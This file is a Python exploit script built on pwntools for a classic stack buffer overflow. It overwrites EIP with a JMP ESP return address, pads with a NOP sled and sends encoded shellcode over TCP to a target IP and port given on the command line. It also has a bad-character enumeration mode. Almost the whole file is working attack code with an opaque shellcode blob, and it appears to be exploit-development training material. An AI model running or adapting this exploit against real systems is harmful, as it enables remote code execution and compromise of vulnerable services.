import argparse
from pprint import pprint

from pwn import flat, remote, shellcraft, asm
from pwnlib.encoders import encoder


def send_payload(
    conn,
    offset_eip,
    return_pointer,
    prepend_cmd="",
    shellcode=None,
    max_buffer_size=None
):
    data = {
        0: prepend_cmd,
        offset_eip
        + len(
            prepend_cmd
        ): return_pointer,  # To test this, set breakpoint on jmp_esp_address
        offset_eip + len(prepend_cmd) + 4: shellcode,
    }
    print("payload: ")
    pprint(data)

    payload = flat(
        data,
        length=max_buffer_size,
    )
    print("sending payload...")

    conn.send(payload)


if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument(
        "-ip",
        "--target_ip",
        type=str,
        required=True,
        help="IP Address of the target machine",
    )
    parser.add_argument(
        "-p",
        "--target_port",
        type=int,
        required=True,
        help="Port of the target service",
    )
    parser.add_argument(
        "-oi",
        "--offset-eip",
        type=int,
        required=True,
        help="Offset before Instruction Pointer",
    )
    parser.add_argument(
        "-ra", "--return-address", type=str, required=True, help="JMP ESP"
    )

    parser.add_argument(
        "-s",
        "--payload_size",
        type=int,
        required=False,
        help="Size of the payload that will be sent.",
    )
    parser.add_argument(
        "-c",
        "--prepend_cmd",
        type=str,
        required=False,
        default="",
        help="A data to be prepended in the payload",
    )
    parser.add_argument(
        "-sb", "--send-bad-chars", type=bool, required=False, default=False
    )
    parser.add_argument("-eb", "--except-bad-chars", type=str, required=False, help="Bad char to exclude. i.e. '\\x00,\\x01'")
    args = parser.parse_args()

    target_ip = args.target_ip
    target_port = args.target_port

    max_buffer_size = args.payload_size
    prepend_cmd = args.prepend_cmd
    offset_before_instruction_pointer = args.offset_eip
    return_address = int(args.return_address, 16)

    send_bad_chars = args.send_bad_chars
    except_bad_chars = args.except_bad_chars

    if send_bad_chars:
        shellcode = (
          b"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10"
          b"\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
          b"\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30"
          b"\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
          b"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50"
          b"\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"
          b"\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70"
          b"\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"
          b"\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90"
          b"\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"
          b"\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0"
          b"\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"
          b"\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0"
          b"\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
          b"\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0"
          b"\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"
        )

        if except_bad_chars:
            except_bad_chars = list(except_bad_chars.split(","))
            for char in except_bad_chars:
                _char = bytes.fromhex(char.replace("\\x",""))
                print("removing in badchars: " + ''.join(['\\x%02x' % b for b in _char]))
                shellcode = shellcode.replace(_char, b"")

        print("badchars: " + ''.join(['\\x%02x' % b for b in shellcode]))

    else:
        # Play nopshed size
        nopshed_size = 16
        shellcode = b"\x90" * nopshed_size

        # Try different payload encoding, or try double encoding
        shellcode += b"\xfc\xbb\x73\xb5\x62\x53\xeb\x0c\x5e\x56\x31"
        shellcode += b"\x1e\xad\x01\xc3\x85\xc0\x75\xf7\xc3\xe8\xef"
        shellcode += b"\xff\xff\xff\x8f\x5d\xe0\x53\x6f\x9e\x85\xda"
        shellcode += b"\x8a\xaf\x85\xb9\xdf\x80\x35\xc9\x8d\x2c\xbd"
        shellcode += b"\x9f\x25\xa6\xb3\x37\x4a\x0f\x79\x6e\x65\x90"
        shellcode += b"\xd2\x52\xe4\x12\x29\x87\xc6\x2b\xe2\xda\x07"
        shellcode += b"\x6b\x1f\x16\x55\x24\x6b\x85\x49\x41\x21\x16"
        shellcode += b"\xe2\x19\xa7\x1e\x17\xe9\xc6\x0f\x86\x61\x91"
        shellcode += b"\x8f\x29\xa5\xa9\x99\x31\xaa\x94\x50\xca\x18"
        shellcode += b"\x62\x63\x1a\x51\x8b\xc8\x63\x5d\x7e\x10\xa4"
        shellcode += b"\x5a\x61\x67\xdc\x98\x1c\x70\x1b\xe2\xfa\xf5"
        shellcode += b"\xbf\x44\x88\xae\x1b\x74\x5d\x28\xe8\x7a\x2a"
        shellcode += b"\x3e\xb6\x9e\xad\x93\xcd\x9b\x26\x12\x01\x2a"
        shellcode += b"\x7c\x31\x85\x76\x26\x58\x9c\xd2\x89\x65\xfe"
        shellcode += b"\xbc\x76\xc0\x75\x50\x62\x79\xd4\x3d\x47\xb0"
        shellcode += b"\xe6\xbd\xcf\xc3\x95\x8f\x50\x78\x31\xbc\x19"
        shellcode += b"\xa6\xc6\xc3\x33\x1e\x58\x3a\xbc\x5f\x71\xf9"
        shellcode += b"\xe8\x0f\xe9\x28\x91\xdb\xe9\xd5\x44\x4b\xb9"
        shellcode += b"\x79\x37\x2c\x69\x3a\xe7\xc4\x63\xb5\xd8\xf5"
        shellcode += b"\x8c\x1f\x71\x9f\x77\xc8\x74\x71\x64\xcc\xe1"
        shellcode += b"\x73\x8a\xc9\xc8\xfa\x6c\xbb\x3a\xab\x27\x54"
        shellcode += b"\xa2\xf6\xb3\xc5\x2b\x2d\xbe\xc6\xa0\xc2\x3f"
        shellcode += b"\x88\x40\xae\x53\x7d\xa1\xe5\x09\x28\xbe\xd3"
        shellcode += b"\x25\xb6\x2d\xb8\xb5\xb1\x4d\x17\xe2\x96\xa0"
        shellcode += b"\x6e\x66\x0b\x9a\xd8\x94\xd6\x7a\x22\x1c\x0d"
        shellcode += b"\xbf\xad\x9d\xc0\xfb\x89\x8d\x1c\x03\x96\xf9"
        shellcode += b"\xf0\x52\x40\x57\xb7\x0c\x22\x01\x61\xe2\xec"
        shellcode += b"\xc5\xf4\xc8\x2e\x93\xf8\x04\xd9\x7b\x48\xf1"
        shellcode += b"\x9c\x84\x65\x95\x28\xfd\x9b\x05\xd6\xd4\x1f"
        shellcode += b"\x25\x35\xfc\x55\xce\xe0\x95\xd7\x93\x12\x40"
        shellcode += b"\x1b\xaa\x90\x60\xe4\x49\x88\x01\xe1\x16\x0e"
        shellcode += b"\xfa\x9b\x07\xfb\xfc\x08\x27\x2e\xfc\xae\xd7"
        shellcode += b"\xd1"

    conn = remote(target_ip, target_port, typ="tcp")
    send_payload(
        conn,
        offset_before_instruction_pointer,
        return_address,
        prepend_cmd,
        shellcode=shellcode,
        max_buffer_size=max_buffer_size
    )
    conn.close()
